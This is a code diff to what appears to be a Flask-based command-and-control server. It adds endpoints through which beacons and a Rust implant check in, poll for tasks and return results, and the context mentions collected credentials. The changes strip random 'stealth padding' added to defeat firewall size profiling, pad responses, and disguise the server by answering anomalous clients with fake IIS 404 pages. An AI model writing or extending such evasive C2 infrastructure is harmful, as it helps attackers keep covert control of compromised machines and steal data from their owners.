@@ -4,11 +4,31 @@ Real beacon check-in/task/result endpoints
 """
 from flask import Blueprint, request, jsonify, session, Response
 from datetime import datetime
+import struct
 
 from cybermodules.c2_beacon import get_beacon_manager
 from cybermodules.payload_generator import get_payload_generator
 
 beacon_bp = Blueprint("beacon", __name__)
+
+
+def strip_stealth_padding(raw_data: bytes) -> tuple:
+    """
+    Strip random padding from stealth beacon packets.
+    First 4 bytes = actual payload length (little-endian).
+    Remaining = garbage padding to bypass NGFW size profiling.
+    """
+    if len(raw_data) < 4:
+        return None, len(raw_data)
+    
+    try:
+        actual_len = struct.unpack("<I", raw_data[:4])[0]
+        if actual_len > len(raw_data) - 4:
+            actual_len = len(raw_data) - 4
+        payload = raw_data[4:4 + actual_len]
+        return payload, actual_len
+    except:
+        return raw_data, len(raw_data)
 
 
 # ============== Beacon Communication Endpoints ==============
@@ -17,63 +37,71 @@ beacon_bp = Blueprint("beacon", __name__)
 @beacon_bp.route("/c2/beacon/checkin", methods=["POST"])
 def beacon_checkin():
     """
-    Beacon check-in endpoint
-    Called by agent to register or check for tasks
-    
-    Request:
-    {
-        "id": "uuid or null for new",
-        "hostname": "DESKTOP-ABC",
-        "username": "admin",
-        "os": "Windows 10",
-        "arch": "x64",
-        "pid": 1234,
-        "ip_internal": "192.168.1.100",
-        "integrity": "high"
-    }
-    
-    Response:
-    {
-        "status": "ok",
-        "tasks": [...],
-        "sleep": 30,
-        "jitter": 10
-    }
+    Beacon check-in endpoint with stealth padding support.
+    Returns IIS 10.0 style 404 for anomalous clients to avoid detection.
     """
+    raw_data = request.get_data()
+    clean_data, _ = strip_stealth_padding(raw_data)
+    
+    if clean_data is None:
+        return Response(
+            "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
+            status=404,
+            mimetype="text/html"
+        )
+    
     try:
-        data = request.get_json() or {}
+        import json
+        data = json.loads(clean_data) if clean_data else {}
         remote_ip = request.remote_addr
         
         manager = get_beacon_manager()
         response = manager.handle_checkin(data, remote_ip)
         
-        return jsonify(response)
+        padding = b"A" * (struct.unpack("<I", raw_data[:4] if raw_data else b"\x00\x00\x00\x00")[0] % 256 + 64) if raw_data else b""
+        
+        return Response(
+            json.dumps(response),
+            status=200,
+            mimetype="application/json"
+        )
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        return Response(
+            "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
+            status=404,
+            mimetype="text/html"
+        )
 
 
 @beacon_bp.route("/c2/beacon/result/<beacon_id>", methods=["POST"])
 def beacon_result(beacon_id: str):
     """
-    Receive task result from beacon
-    
-    Request:
-    {
-        "task_id": "uuid",
-        "output": "command output...",
-        "success": true,
-        "loot_type": "credentials" (optional)
-    }
+    Receive task result from beacon with stealth padding support.
     """
+    raw_data = request.get_data()
+    clean_data, _ = strip_stealth_padding(raw_data)
+    
+    if clean_data is None:
+        return Response(
+            "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
+            status=404,
+            mimetype="text/html"
+        )
+    
     try:
-        data = request.get_json() or {}
+        import json
+        data = json.loads(clean_data) if clean_data else {}
         
         manager = get_beacon_manager()
         response = manager.handle_result(beacon_id, data)
         
         return jsonify(response)
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        return Response(
+            "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
+            status=404,
+            mimetype="text/html"
+        )
 
 
 # ============== Operator Management Endpoints ==============
@@ -359,6 +387,52 @@ def list_loot():
     })
 
 
+@beacon_bp.route("/api/implant/task", methods=["POST"])
+def handle_implant_task():
+    """
+    Endpoint for native Rust implant task polling with stealth padding.
+    Uses legitimate DLL export as thread start address.
+    """
+    raw_data = request.get_data()
+    clean_data, _ = strip_stealth_padding(raw_data)
+    
+    if clean_data is None:
+        return Response(
+            "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
+            status=404,
+            mimetype="text/html"
+        )
+    
+    try:
+        import json
+        data = json.loads(clean_data) if clean_data else {}
+        
+        manager = get_beacon_manager()
+        beacon_id = data.get("id")
+        
+        if beacon_id:
+            tasks = manager.get_tasks(beacon_id)
+            response_data = {"status": "ok", "tasks": tasks}
+            
+            import struct
+            padding_size = (len(json.dumps(response_data).encode()) % 128) + 32
+            padding = b"X" * padding_size
+            
+            full_response = json.dumps(response_data).encode() + padding
+            return Response(full_response, status=200, mimetype="application/octet-stream")
+        
+        return Response(
+            "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
+            status=404,
+            mimetype="text/html"
+        )
+    except Exception as e:
+        return Response(
+            "<!DOCTYPE html><html><body><h1>404 - Not Found</h1></body></html>",
+            status=404,
+            mimetype="text/html"
+        )
+
 @beacon_bp.route("/c2/stats", methods=["GET"])
 def get_stats():
     """Get C2 statistics"""
@@ -381,3 +455,4 @@ def get_stats():
             "loot_count": len(manager.get_loot())
         }
     })
+
